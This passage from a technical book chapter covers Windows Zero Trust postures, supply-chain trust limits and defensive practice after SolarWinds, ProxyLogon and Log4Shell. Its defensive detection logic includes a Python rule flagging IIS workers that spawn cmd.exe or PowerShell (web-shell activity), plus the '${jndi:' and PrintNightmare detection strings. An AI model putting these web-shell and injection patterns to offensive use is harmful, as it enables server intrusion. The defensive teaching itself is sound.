**Microsoft full-stack Zero Trust.** The Microsoft posture is tightly integrated: Microsoft Entra ID for identity, Defender XDR for endpoint and cloud telemetry, Intune for device management, Purview for data classification, with Conditional Access as the policy engine that ties them together [1117,1199]. Microsoft Inside Track's published case study describes Microsoft's own seven-year internal transformation along this stack, anchored on four canonical scenarios: phishing-resistant MFA everywhere, device health attested before access, pervasive telemetry, and least-privilege enforcement [1200]. Microsoft's deployment guide hub organizes the architecture along six pillars (Identity, Endpoints, Applications, Data, Infrastructure, Networks). Microsoft maintains a customer-stories portal at `customers.microsoft.com` with published case studies across consumer-goods, financial-services, healthcare, and public-sector cohorts. The case for the full-stack posture: operational coherence, integrated telemetry across identity and device, one policy plane to reason about. The case against: single-vendor risk, which SolarWinds made acutely concrete. A posture in which one vendor supplies your operating system, identity provider, endpoint, and cloud productivity stack is architecturally homogeneous in exactly the way SUNBURST taught the industry to interrogate.

**Best-of-breed multi-vendor.** The third-party alternative composes an identity-as-a-service provider (Okta or Ping Identity), a third-party EDR (CrowdStrike Falcon or SentinelOne), a Secure Service Edge or Secure Web Gateway (Palo Alto Prisma or Zscaler), and a separate SIEM and SOAR for telemetry and orchestration. Okta's customer-stories portal positions itself around a "two-thirds of the Fortune 100" framing [1201]; the multi-vendor cohort spans Fortune 500 deployments across logistics, telecom, hospitality, and retail, with case studies on Okta's per-customer pages [1201]. The case for: cross-vendor coverage of the supply-chain class, on the principle that two independent vendor failures are less correlated than one. The case against: operational complexity, integration burden, and the recursive observation that *any* third-party vendor on the trusted-publisher list is itself a SolarWinds-style trust assumption: the multi-vendor posture distributes the risk rather than eliminating it.

> **Sidebar.** Both Microsoft's and Okta's customer-stories portals are organized by industry segment and per-customer case-study URL; specific named-customer cohorts vary as case studies are added, retired, or refreshed, so this chapter keeps the cohort framing at the industry-segment level rather than enumerating a fixed list of named brands [1200,1201].

**Federal Zero Trust (CISA ZTMM v2.0 and the OMB M-22-09 baseline).** CISA published the Zero Trust Maturity Model v2.0 in April 2023 [1202]. The model defines a vendor-neutral architecture across five pillars (Identity, Devices, Networks, Applications and Workloads, Data) with three cross-cutting capabilities (Visibility and Analytics, Automation and Orchestration, Governance) and four maturity stages (Traditional, Initial, Advanced, Optimal). OMB Memorandum M-22-09 set the FY24 implementation baseline [1185]. The DHS-specific operationalization, *CISA Zero Trust Architecture Implementation*, was published in January 2025 as the playbook for the department-level rollouts [1203]. The GAO audit GAO-24-106343 reported in March 2024 that the lead-implementation agencies (CISA, NIST, OMB) had fully completed 49 of 55 EO 14028 requirements, partially completed 5, with one not applicable [1204]. The SEC Office of Inspector General's September 2023 Final Management Letter is the canonical published example of an agency-level M-22-09 readiness review [1205]. The case for: auditability, procurement neutrality, alignment with the federal mandate, and a measurable scorecard. The case against: it is a maturity model rather than an architectural specification, and adoption pace across federal civilian agencies has lagged the FY24 target the OMB memo set.

| Pillar / Cost dimension | Microsoft full-stack | Best-of-breed multi-vendor | Federal CISA ZTMM v2.0 |
|---|---|---|---|
| Trust root | Microsoft Entra ID + Microsoft Pluton | Mixed (Okta or Ping for SAML, third-party EDR) | Vendor-neutral; agency choice within five pillars |
| Identity plane | Entra ID with Conditional Access, CAE, PRT | Okta or Ping with SAML to downstream apps | Identity pillar with phishing-resistant MFA baseline |
| Endpoint | Defender for Endpoint | CrowdStrike Falcon or SentinelOne | Devices pillar; agency-selected EDR |
| Network | Microsoft Global Secure Access | Palo Alto Prisma or Zscaler | Networks pillar; SASE neutral |
| Integration FTE estimate | Low to medium (single-vendor APIs) | High (cross-vendor API integration) | Medium to high (M-22-09 compliance overhead) |
| Vendor supply-chain blast radius | Concentrated at one vendor | Distributed across four-plus vendors | Distributed; auditability primary |

> **Aside. Why Microsoft's own SolarWinds experience is the best-of-breed argument.**
> Microsoft was a SolarWinds Orion customer. Microsoft was one of the roughly one hundred follow-on victims of the SUNBURST follow-on phase. The MSRC final investigation update of February 18, 2021 documented the actor's late-November 2020 first viewing of files in source repositories, with continued attempts at access into early January 2021 [1206]. The report named the targeted product families (a small subset of Azure, Intune, and Exchange source-code repositories) and confirmed no evidence of access to production services or customer data. Microsoft's own written conclusion was instructive: defense-in-depth protections prevented the actor from acquiring privileged credentials or executing SAML-token-forgery against Microsoft's corporate domains, and "in deployments that connect on-premises infrastructure to the cloud, organizations can delegate trust to on-premises components... this creates an additional seam that organizations need to secure."
>
> The best-of-breed multi-vendor argument is most concretely supported by Microsoft's own post-incident analysis, not by any third-party advocacy. A Zero Trust posture in which the *policy engine* and the *operating system* and the *identity provider* share a vendor (and that vendor was itself a follow-on victim of a supply-chain compromise that targeted its source repositories) needs to interrogate the assumption that one vendor's defense-in-depth is the load-bearing primitive. The Microsoft public conclusion is that defense-in-depth held; the structural observation the post-mortem invites is that "no single vendor should be the trust anchor for the policy engine that defends against vendor compromise."
>
> **Additional axis: where the integration cost lands.**
> Per-vendor licensing is the visible cost. The hidden cost is the engineering FTE the organization needs to maintain the integration graph between products: SCIM provisioning between IdP and downstream apps; SIEM connector maintenance across product versions; cross-product alert-correlation logic that the XDR composition plane handles for free in the Microsoft full-stack but has to be built from scratch in the best-of-breed posture. Federal cohort budgets generally absorb this via a dedicated cybersecurity-modernization line item that commercial Zero Trust pilots rarely receive. The integration-FTE cost is the most under-discussed input to the three-position choice.

All three are responses to the same incident clustering; none of them closes the structural ceiling that follows.

## What even perfect execution cannot reach

If the four 2020-2021 incidents broke four engineering assumptions, the three bounds in this section are not engineering. They are mathematics and architecture.

**Thompson's "Trusting Trust."** A compiler that compiles itself can embed a backdoor that survives indefinitely with no trace in any audited source [1124,1125]. SLSA addresses the *visibility* problem (what is in your supply chain) by attesting to build steps and provenance [1130]. SBOM addresses the *composition* problem (what components are in your artifact) by inventorying dependencies. Neither addresses the *trust* problem (what your supply-chain participants chose to do at points the attestations do not cover). SLSA Build Level 3 hardens the build platform; the hardened build platform's own toolchain is still an implicit trust root, and an attacker who compromises the toolchain at a layer below the attestation produces attested artifacts that are nevertheless malicious. The 1984 bound is not closed by 2026 supply-chain tooling.

> **Definition, Rice's Theorem.**
> A foundational result in computability theory (Henry Rice, 1953) stating that for any non-trivial semantic property of programs, no algorithm decides whether an arbitrary program has that property. The theorem bounds what static analysis of program behavior can achieve: no analyzer can decide, in general, whether a program will exfiltrate data, alter records, escalate privileges, or otherwise perform a given semantic action. Fred Cohen's "Computer Viruses: Theory and Experiments," presented in 1984, applied the same bound to malware detection [1207]: no general algorithm can decide whether a program is a virus. SBOM tells you *what* is running; Rice tells you it cannot tell you whether what is running is safe.

**Cohen's 1984 virus result and Rice's Theorem.** SBOM data, combined with vulnerability databases, can answer "do we have a known-vulnerable component?", and Log4Shell IR proved that answer's value. SBOM cannot answer "is the component we have behaving safely?", and the post-Log4Shell follow-on CVEs proved that gap's reality. The composition is decidable; the semantics is not. Rice's Theorem is the bound on what an SBOM-plus-CVE-database posture can detect at scale.

**The same-privilege paradox at the orchestration plane.** A Zero Trust policy engine that decides every access decision is itself a privileged component. If the policy engine is compromised, the decisions it produces are not trustworthy, and the resources downstream of the engine cannot tell legitimate decisions from forged ones. Microsoft's "Assume Breach" third principle [1117] is the operational acknowledgment that this ceiling is unsolved rather than closed. "Assume Breach" is a posture for limiting blast radius after compromise, not a mechanism for preventing the compromise of the orchestration plane itself.

The 1984 result was load-bearing in December 2020. The 1953 theorem remains load-bearing in this edition. Both are still load-bearing, and the post-2023 stack does not close either.

## Five things the 2026 stack still cannot do

The post-2021 defensive stack is a necessary architectural pivot. It is not sufficient. Five honest residuals close out the open-problem framing.

**Build-pipeline trust at scale.** As of this writing, SLSA Build Level 3 adoption remains uneven rather than a population default. Reproducible builds are still a research aspiration on most Linux distributions and an aspirational footnote on Windows. The median enterprise cannot answer "did this binary come from this source commit?" with cryptographic evidence; the answer in practice is "the vendor's release notes say so." in-toto attestations [1133] cover specific build steps in mature deployments. The post-2021 stack reduces the surface SUNBURST exploited; it does not foreclose it.

**Identity-provider compromise as a class.** Storm-0558 (disclosed July 2023, with the initial Microsoft technical investigation published in September 2023 and partially walked back in March 2024) is the post-window existence proof that the policy engine itself is a privileged plane [1208]. Microsoft no longer treats the crash-dump path as confirmed; the CSRB concluded Microsoft was unable to determine how or when Storm-0558 obtained the consumer Microsoft Account (MSA) signing key. A validation flaw in Microsoft's enterprise token validation allowed that consumer key to sign enterprise tokens; the attacker forged Outlook Web Access and Exchange Online tokens for 22 enterprise organizations, including U.S. State Department mailboxes, and approximately 503 related personal accounts. The incident is the finale's subject: When the Chain Snaps: Storm-0558 (Chapter 29).

> **Definition, Storm-0558.**
> Microsoft's designation for the China-based threat actor responsible for the July 2023 forged-token campaign against Outlook Web Access and Exchange Online, affecting 22 enterprise organizations including U.S. State Department mailboxes and approximately 503 related personal accounts [1208]. The incident sits outside this chapter's December 2021 closing window and is the subject of the finale, When the Chain Snaps: Storm-0558 (Chapter 29).
>
> **Aside: The Storm-0558 preview.**
> The finale, When the Chain Snaps: Storm-0558 (Chapter 29), picks up the trust-root layer where the post-2021 stack left it. The architectural shape of the next era is the question Storm-0558 opened: if the identity provider's signing key is the trust root, what closes the compromise of that key as a class? Plausible answers in 2026 include shorter-lived signing keys with cryptographic attestation of issuance, threshold-signed identity providers that require multi-party participation in key use, sender-constrained tokens (DPoP) that bind tokens to specific client keys, and hardware-rooted attestation chains for identity-provider infrastructure. All of these are research-grade or early-deployment as of this writing; the trust-root layer is the architectural frontier the post-2023 incidents have foregrounded.

**Cross-vendor and managed-service-provider supply chains.** The SolarWinds-class lesson did not generalize. The 3CX VoIP-client supply-chain compromise in March 2023 (attributed to UNC4736, a suspected North Korean nexus cluster Mandiant linked to Lazarus-class operations) [1209], the MOVEit file-transfer mass-exploitation by Cl0p in May-June 2023 [1210], and the Change Healthcare [1211] and CDK Global [1212] cascades in 2024 demonstrated that the build-pipeline-trust lesson translated unevenly across third-party data-transfer and managed-service-provider classes. SLSA and SBOM are necessary tooling; they have not produced a population-level change in cross-vendor supply-chain risk.

> **Sidebar.** The 2023-2024 supply-chain cascade (3CX, MOVEit, Change Healthcare, CDK Global) is the empirical reply to the "SolarWinds taught the industry" narrative. The lesson taught the industry to look for build-pipeline compromise of large software vendors; it did not, at the population level, teach the industry to look for the same class of compromise in mid-market communications, file-transfer, and dealer-management vendors. The structural problem the four-incident cluster of 2020-2021 named is still operative.

**Conditional Access policy drift.** Mature Microsoft Entra tenants routinely carry dozens of Conditional Access policies, with overlapping conditions, exclusions, and break-glass account exceptions. As of this writing, the cloud-identity equivalent of BloodHound (a graph-analysis approach to enumerating reachable Tier-0 identities and policy bypasses) remains less mature than its on-premises Active Directory counterpart. AzureHound and BloodHound Community Edition [1127] extend the on-premises model to the cloud, but production tooling for policy-graph analysis has not yet reached parity with the rate at which CA policies accumulate.

**SBOM as forensics tool versus prevention tool.** The Log4Shell IR experience demonstrated SBOM's *forensics* utility: organizations that had SBOM data answered "are we exposed?" in hours, while organizations without it took weeks. The *prevention* utility (refusing to install software whose components fail policy) has been slower to mature, both because component-policy semantics are not standardized and because the practical effect would be a substantial change to the enterprise software procurement model.

## What a practitioner does today

If you are reading this on a Monday, here is what you do this week, this quarter, this year, and what you stop trying to do entirely.

**Lane 1: Preventive hygiene.** Inventory vendor build-pipeline exposure. Which vendors push signed code to your endpoints? Which auto-update? Which are deployed via SCCM, Intune, or Workspace ONE? The inventory is the SolarWinds homework. Inventory internet-facing pre-auth surfaces (the ProxyLogon homework).

For build pipelines you own, the operational answer to the SUNSPOT lesson is the four-primitive chain that OpenSSF's SLSA v1.0 framework calls Build Level 3 [1213]:

1. **GitHub Actions OIDC ID tokens** as workflow-bound short-lived identities, requested via `permissions: id-token: write` in the workflow YAML. The token's subject claim binds the job to a named workflow file and ref [1214].
2. **Sigstore Fulcio** as the public-good keyless-signing certificate authority. Fulcio accepts the OIDC token plus an in-memory ephemeral keypair and returns a ~10-minute X.509 cert with the workflow SAN encoded into it [1215,1216].
3. **cosign** signs the artifact with the ephemeral key and uploads the signature, certificate, and transparency-proof bundle [1216].
4. **Rekor**, the Trillian-backed Merkle-tree transparency log at `rekor.sigstore.dev`, returns a signed entry timestamp that asserts the signature existed before any later attacker could back-date it [1217].

No human signing key. No long-lived signing cert. No manual rotation. Every signing event is publicly auditable. SLSA Build Level 3 provenance is generated by the build platform itself through the OpenSSF reference reusable workflow `slsa-framework/slsa-github-generator` and attested through the same cosign + Rekor lane [1218]. Pair the chain with one of three SBOM-attestation tools as the predicate payload: Microsoft's `sbom-tool` for SPDX 2.2 / 3.0 drops on Microsoft-stack artifacts [398], Anchore's `syft` for multi-language SPDX + CycloneDX generation natively paired with the Grype vulnerability scanner [1219], or Aqua Security's `trivy` for single-step SBOM plus CVE plus IaC plus license plus secret scanning [1220].

> **Definition: SLSA Build Level 3.**
> The OpenSSF SLSA framework's third Build-track level [1213], reached when a build produces provenance that is *unforgeable* relative to the build platform itself. SLSA v1.0 (April 2023) defines three Build levels: L1 requires that provenance exists; L2 requires that provenance is authentic (signed by the build platform); L3 requires that provenance is unforgeable. That is, the build platform's own identity is the signer, and no tenant on the build platform can produce provenance attributable to another tenant. Build L3 is what closes the SUNSPOT class for hosted-CI environments: even a tenant who controls their own build job cannot forge provenance for somebody else's artifact.
>
> **Definition, Sigstore.**
> The Linux Foundation public-good keyless-signing project, composed of three components: **Fulcio**, a certificate authority that issues short-lived (~10-minute) X.509 certificates binding an ephemeral keypair to an OpenID Connect identity claim; **cosign**, the command-line tool that orchestrates the keyless-signing workflow against Fulcio and Rekor; and **Rekor**, an append-only transparency log built on Google's Trillian Merkle-tree library that records every signing event and returns a signed entry timestamp [1215,1216,1217]. The architectural property Sigstore delivers is the elimination of long-lived signing keys: a build job that runs for ten minutes signs an artifact with a key that exists only for the duration of the job, after which both the key and the certificate expire.
>
> **Sidebar.** The canonical command-level tutorial for the Lane 1 chain lives at the OpenSSF SLSA "Producing Artifacts" requirements page [1213] and the `slsa-framework/slsa-github-generator` reusable-workflow README [1218]; this chapter is the architectural primer, not the command reference.

Enable LSA Protection on every endpoint that supports it: not just new Windows 11 22H2 clean installs, but every system in the fleet that can carry the configuration [436]. Enable the Vulnerable Driver Blocklist [1196]. Disable the Print Spooler on Domain Controllers as standing policy, per CISA ED 21-04 [1166]. Roll out Pluton where the OEM ships it enabled; audit "Pluton present but disabled" with the same rigor as "TPM present but disabled."

**Lane 2: Detection deployment.** Microsoft Defender for Identity has SACL-based detections for DCSync, Golden Ticket, and Golden SAML signal patterns; deploy them and tune. Microsoft Defender for Endpoint has web-shell detections for ProxyLogon-class IIS worker processes spawning shells or script interpreters; deploy them on every Exchange front-end. Sigma rules for the canonical post-exploitation fingerprints (the `${jndi:` substring in any logged event field for Log4Shell-class detection; `RpcAddPrinterDriverEx` for PrintNightmare-class detection on Domain Controllers).

For the Conditional Access policy-drift surface named as the third open problem above, three open-source tools form a complementary cohort. None subsumes the others; each closes a structurally distinct detection lane.

**Maester** is a PowerShell + Pester test-automation framework that wraps the Microsoft Graph Conditional Access "What If" evaluation API in the `Test-MtConditionalAccessWhatIf` cmdlet. It ships built-in test profiles aligned to the OMB M-22-09 phishing-resistant-MFA baseline and the CISA ZTMM v2.0 Identity-pillar Optimal stage, and is designed to run as a recurring GitHub Actions, Azure DevOps, or Azure Automation job [1221,1222,1223]. Maester occupies the **assertion lane**: does the deployed CA-policy state pass an asserted baseline under What-If simulation?

**CAOptics**, Joosua Santasalo's Node.js permutation-enumeration tool, evaluates the (subject x app x condition) tuple space against the same Microsoft Graph CA-evaluation API and reports the gaps. It catches break-glass-account exclusion-clause interactions that Maester's assertion profiles do not exercise [1224]. CAOptics occupies the **gap-enumeration lane**.

**BloodHound Community Edition with the SpecterOps AzureHound collector** is the cloud-side companion to SharpHound's on-premises Active Directory enumeration. Combined BloodHound CE graph models both on-premises and cloud-identity attack paths with explicit cross-boundary edges for Azure AD Connect, Pass-Through Authentication, hybrid-joined devices, and federated trusts [1225,1226,1127]. BloodHound CE plus AzureHound occupies the **graph-reachability lane**: what is the set of lateral-movement paths from any identity to any Tier-0 cloud or on-premises identity?

Layer the three tools together. The composition is the operational closure of the "Conditional Access is policy" claim against the policy-drift open problem.

> **Sidebar.** CAOptics was archived read-only by its maintainer in August 2024 with the README note "Project archived due to shifting development priorities" [1224]. The tool remains functional and architecturally canonical for the gap-enumeration lane; readers wanting active development for the graph-reachability lane should track SpecterOps's BloodHound CE AzureHound documentation [1226] for the rolling-release collector and BloodHound CE schema updates.

**Sigma-style rule: detect IIS worker-spawned shells (ProxyLogon web-shell fingerprint).**

```python
# Logic equivalent of a Sigma rule for the ProxyLogon-class web-shell
# pivot. The rule matches the canonical fingerprint: an IIS worker process
# spawning an interactive shell or script interpreter, regardless of account.

def matches_proxylogon_pivot(event):
    child = event.get('process_name', '').lower()
    suspicious_children = ('cmd.exe', 'powershell.exe', 'cscript.exe', 'wscript.exe')
    return (
        event.get('event_id') == 4688  # process creation
        and event.get('parent_process_name', '').lower().endswith('w3wp.exe')
        and any(child.endswith(name) for name in suspicious_children)
    )

example = {
    'event_id': 4688,
    'parent_process_name': 'C:\\Windows\\System32\\inetsrv\\w3wp.exe',
    'process_name': 'C:\\Windows\\System32\\cmd.exe',
    'user_name': 'NT AUTHORITY\\NETWORK SERVICE',
}
print('match' if matches_proxylogon_pivot(example) else 'no match')
```

**Lane 3: Confirmed-compromise response.** A confirmed signed-vendor-update compromise is a vendor-level incident. Rotate every secret the trojanized binary could have read. Treat ADFS token-signing certificates as compromised; rotate them with new private key material on hardware-attested storage where possible. Rotate `krbtgt` twice per the Microsoft AD Forest Recovery procedure to invalidate any forged Kerberos tickets. Assume Conditional Access policies were bypassed during the active window if Golden SAML was in play; review sign-in logs for the affected federated trust for the full intrusion window.

> **Sidebar.** The double-`krbtgt` rotation is not paranoia. A single rotation invalidates tickets signed with the prior key; a second rotation, after the configured maximum-ticket-lifetime, ensures the prior-prior key is also retired and no ticket signed with either prior key is still valid. The Microsoft AD Forest Recovery procedure documents the operation explicitly, with a minimum 10-hour wait between resets to exceed the default Maximum-Lifetime-For-User-Ticket and Maximum-Lifetime-For-Service-Ticket policy values [789]. The procedure exists because the second rotation cannot happen until any in-flight ticket with the prior key has expired, and skipping it leaves a window in which forged tickets remain serviceable. Chapter 18 (KRBTGT) owns the `krbtgt` account and the golden-ticket threat model this recovery step defeats.

**Lane 4: What does not work.** The operational anti-patterns the four incidents made expensive.

> **Callout. What does not work.**
> Patching CVE-2021-26855 alone is insufficient if the web shell was already on disk before the patch. The patch closes the entry; it does not remove the shell. Rotating `krbtgt` does not address Golden SAML; Golden SAML is a SAML-token-signing problem, and `krbtgt` is the Kerberos key. Rotating ADFS token-signing certificates is the corresponding action. Enabling Conditional Access for the identity the attacker forged tokens for is a closed-stable-door fix; Conditional Access enforcement happens at the resource server, and a forged SAML assertion already passed through the identity layer at the moment the resource server checks. Pluton on the workstation does not retroactively protect the Domain Controller. Pluton is workstation-class silicon in 2023, and Server SKUs are a separate roadmap.

The misconception index closes the audit-flagged premises this chapter opened with as terse back-references rather than a second pass through the chapter.

## Misconception Index

### Was ProxyLogon 'four chained zero-days in a single exploit'?

No. As detailed above, the canonical pre-auth ProxyLogon path is CVE-2021-26855 into CVE-2021-26858 or CVE-2021-27065 and then a SYSTEM web shell [1152,1156]. CVE-2021-26857 is a separate authenticated Unified Messaging RCE, patched in the same emergency release but not a fused step in that chain.

### Were 250,000 Exchange servers compromised before Microsoft's March 2 patch?

No. As above, Krebs reported "at least 30,000" U.S. organizations on March 5 [1157], while Bloomberg reported at least 60,000 known global victims on March 7 [1158]. Larger hundreds-of-thousands-class figures describe post-disclosure web-shell seeding and follow-on mass exploitation, not a clean pre-patch victim count.

### Was Conditional Access integrated with Entra Identity Protection in 2021-2022?

The product was called Azure AD Identity Protection at the time. Azure AD Conditional Access (the policy engine) and Azure AD Identity Protection (the risk-signal source) were already integrated before 2021; the integration is what makes risk-based Conditional Access policies possible. The "Entra" brand was introduced on May 31, 2022 as a family umbrella in Vasu Jakkal's "Secure access for a connected world, meet Microsoft Entra" announcement on the Microsoft Security Blog [1190], and the rename of Azure AD to Microsoft Entra ID (and therefore of Azure AD Identity Protection to Microsoft Entra ID Protection) happened on July 11, 2023 [1191]. Citations to the 2021-2022 product should use the Azure AD naming; citations to the current product use Microsoft Entra ID.

### Did NIST SP 800-207 formalize BeyondCorp?

No. As the lineage section argues, NIST SP 800-207 [1116] cites BeyondCorp as one production implementation, not as the framework it merely formalized. Kindervag's Zero Trust framing predates BeyondCorp [1114,1115], and SP 800-207 is a vendor-neutral synthesis rather than a Google-to-NIST translation.

### Is Log4Shell a 'Windows' vulnerability?

No. The bug is in Apache Log4j 2.x [1171], not Windows. It belongs here because Windows Server fleets hosted large populations of vulnerable Java applications; the lesson is transitive-dependency exposure in enterprise Windows operations, not a Windows kernel or platform flaw.

### Did Microsoft Pluton ship in 2022 or 2023?

Both, depending on the claim. Pluton was announced in November 2020 [49]; Lenovo's Pluton-on-Ryzen-6000 ThinkPad Z13/Z16 ship vehicle reached commercial availability in May 2022 [1187,1186]; broader chipset support followed later [6]. Fleet claims still need the earlier distinction: Pluton present is not Pluton enabled [130].

The four incidents are the audit trail for what changed. The post-2021 defensive stack is the vocabulary the industry borrowed to talk about it. The vocabulary is now sufficient. The trust roots are not. The finale, When the Chain Snaps: Storm-0558 (Chapter 29), picks up the trust-root layer where that stack left it: Storm-0558 (July 2023), the Microsoft consumer-MSA signing-key compromise that produced enterprise tokens Conditional Access could not distinguish from legitimate ones, and the architectural question it opened: if the policy engine itself is privileged, what closes the compromise of the policy engine as a class?

## What it means for you

For a Windows estate, Zero Trust is not an abstract maturity claim. It is a set of joins you should be able to prove: local device state to tenant device object; PRT state to sign-in event; sign-in event to Conditional Access result; Conditional Access result to resource enforcement; resource enforcement to session re-evaluation where supported.

| Residual | Class | Zero Trust buys you | You still need |
|---|---|---|---|
| Stolen token replay from another device | Binding | PRT/device context and token protection where supported reduce off-device replay | Sender-constrained tokens broadly; rapid revocation; browser-session hardening |
| Malware on the bound device | Runtime endpoint | Compliant-device policy blocks unmanaged devices | EDR, application control, least privilege, browser isolation, admin separation |
| Compliance stale after sign-in | Time | CAE and sign-in frequency shrink windows for participating resources | Device-risk integration, continuous endpoint telemetry, session-revocation runbooks |
| Conditional Access policy drift | Policy | A centralized PDP and sign-in logs expose decisions | Policy-as-code review, What-If testing, Maester/Graph audits, break-glass governance |
| Legacy clients and unsupported apps | Coverage | Conditional Access can block known legacy authentication and target resources | App inventory; migration to modern auth; documented exceptions with owners and expiry |
| Identity-provider compromise | Trust root | Least privilege and anomaly detection reduce blast radius | Key hygiene, token anomaly hunting, cross-plane incident response, vendor-risk design |

**Verify it yourself.** Run the endpoint probe first, then correlate it with the cloud sign-in record.

```powershell
# 1. Local device identity, hardware protection, and PRT state
dsregcmd /status | findstr /i "AzureAdJoined DomainJoined DeviceId KeyProvider TpmProtected DeviceAuthStatus AzureAdPrt AzureAdPrtUpdateTime AzureAdPrtExpiryTime"

# 2. TPM readiness behind the hardware-rooted part of the claim
Get-CimInstance -ClassName Win32_Tpm -Namespace root\CIMV2\Security\MicrosoftTpm |
  Select-Object IsEnabled_InitialValue, IsActivated_InitialValue, IsOwned_InitialValue, SpecVersion
```

Then, in Entra sign-in logs or Microsoft Graph, inspect the matching sign-in:

```text
Check these fields for the same access attempt:
- deviceDetail.deviceId matches local DeviceId
- deviceDetail.isManaged == true where management is required
- deviceDetail.isCompliant == true where compliant device is required
- conditionalAccessStatus == success for allowed access
- appliedConditionalAccessPolicies[].result explains which policies applied
- enforcedGrantControls includes the control you intended, not merely any control
- resourceDisplayName is the app you actually care about
```

If the local device is joined and has a PRT but the sign-in log has no matching `deviceId`, the cloud did not evaluate the device you think it did. If `isCompliant` is false or null under a compliant-device policy, the policy should not allow access. If `conditionalAccessStatus` is `notApplied`, your Zero Trust claim is a policy-targeting claim, not an endpoint-security claim. And if the resource is not CAE-aware, treat revocation as bounded by token lifetime rather than near-real-time evaluation.

> **Bequeaths.** Zero Trust hands the next link one reframing, narrow and load-bearing: the entire on-box chain. Measured, hardware-rooted boot state attested in silicon (Chapter 5, Attestation), VTL1 isolation a ring-0 attacker cannot map (Chapter 6, The Secure Kernel), the long-term secret held off the box (Chapter 15, Credential Guard), the device-bound sign-in key (Chapter 20, Windows Hello), and the TPM-bound Primary Refresh Token (Chapter 19, Pass-the-Hash to Pass-the-PRT). Is demoted from *the story* to *a signal*: one input, alongside identity, application, location, and risk, that a cloud Policy Decision Point weighs before it grants access. That demotion is what the Continuous Access Evaluation chapter (Chapter 27) builds on when it insists the decision must stay live after the token is issued. But the bequest stops at the *moment of the grant*: this chapter does not provide continuous post-issuance re-evaluation. Token theft and replay after access is granted belong to the Continuous Access Evaluation chapter (Chapter 27); it does not provide sender-constrained tokens or any proof of user *intent* (a stolen-but-valid token still spends; it does not invert host-over-guest trust for cloud workloads) that belongs to the Confidential VMs chapter (Chapter 28); and it makes no claim once the decision point's *own* signing key is forged. An identity-provider key compromise the decision point cannot distinguish from a legitimate signature belongs to the When the Chain Snaps chapter (Chapter 29). The chain learns to travel off the box as evidence; it does not yet keep that evidence honest after the decision is made.
